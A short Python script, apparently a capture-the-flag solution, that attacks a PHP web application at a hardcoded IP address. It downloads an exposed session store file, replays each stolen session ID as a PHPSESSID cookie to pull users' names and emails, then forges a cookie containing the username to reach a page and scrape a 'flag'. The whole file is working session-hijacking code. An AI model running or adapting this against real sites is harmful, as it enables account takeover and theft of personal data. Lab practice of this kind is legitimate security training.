import requests
import json
import lxml.html as parser
session=requests.Session()


#Step 1:Getting the valid session in the session file
session_file="data/session_store.txt"
url="http://34.77.37.110/restricted-sessions/"
link=url+session_file
response=session.get(link)
sessions=(response.text).split('\n')

# print(sessions)

#Step 2:Getting the userinformation associated with the sessions found
#We need to send a post request with the session value using the name PHPSESSID to getcurrentuserinfo.php
for sessionvalue in sessions:
	link=url+"getcurrentuserinfo.php"
	payload={"PHPSESSID":sessionvalue}
	response=session.post(link,headers={"Cookie":f'PHPSESSID={sessionvalue}'},data=payload)
	content=response.text
	print(f'{sessionvalue} => {content}')
	#Assigning the username and email we obtained to a variables
	username=json.loads(content).get("name","not found")
	email=json.loads(content).get("email","not found")




#Step :Sending all the data we obtained
#We need to attach the username and session to the header and send the request
	custom_headers={"Cookie":f'PHPSESSID={sessionvalue};UserInfo={username}'}
	print(custom_headers)
	response=session.get(url,headers=custom_headers)
	content=response.text
	headers=response.headers
	root=parser.fromstring(content)
	flag=root.xpath('//h3/text()')
	print(f'{flag}\n\n\n')




